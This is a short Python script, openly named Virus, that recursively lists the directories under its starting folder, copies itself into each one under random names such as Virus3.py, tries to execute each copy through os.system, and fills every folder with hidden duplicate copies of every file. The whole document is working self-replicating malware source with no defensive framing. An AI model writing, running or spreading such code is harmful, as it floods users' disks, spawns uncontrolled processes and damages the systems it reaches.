import os       
import shutil   
import random   

class Virus:    #Define the base class Virus
    
    def __init__(self, path=None, target_dir=None, repeat=None):    
        self.path = path                                    
        self.target_dir = []                                
        self.repeat = 2                                     
        self.own_path = os.path.realpath(__file__)          
          
    def list_directories(self,path):                        
        self.target_dir.append(path)                        
        current_dir = os.listdir(path)                      
        
        for file in current_dir:                           
            if not file.startswith('.'):                    
                absolute_path = os.path.join(path, file)    
                print(absolute_path)                        

                if os.path.isdir(absolute_path):            
                    self.list_directories(absolute_path)    
                else:                                       
                    pass
    

    def new_virus(self):   
        for directory in self.target_dir:

            n = random.randint(0,10) 
            new_virus = "Virus" + str(n)+ ".py"
            destination = os.path.join(directory,new_virus)
            shutil.copyfile(self.own_path,destination)
            os.system(new_virus+ " 1 ")

    def replicate(self):
        for directory in self.target_dir:
            file_list_in_dir = os.listdir(directory)
            for file in file_list_in_dir:
                abs_path = os.path.join(directory, file)
                if not abs_path.startswith(".") and not os.path.isdir(abs_path):
                    source = abs_path
                    for i in range(self.repeat):
                        destination = os.path.join(directory,("."+file+str(i)))
                        shutil.copyfile(source,destination)

    def Virus_action(self):     
        self.list_directories(self.path)
        print(self.target_dir)
        self.new_virus() 
        self.replicate()          

if __name__=="__main__":
    current_directory = os.path.abspath("") #Fetch the current directory in which Virus.py file is present
    Virus = Virus(path=current_directory)   #Defining Object Virus for class Virus and setting the attribute path to current directory
    Virus.Virus_action()                    #Accessing class attribute and method through objects
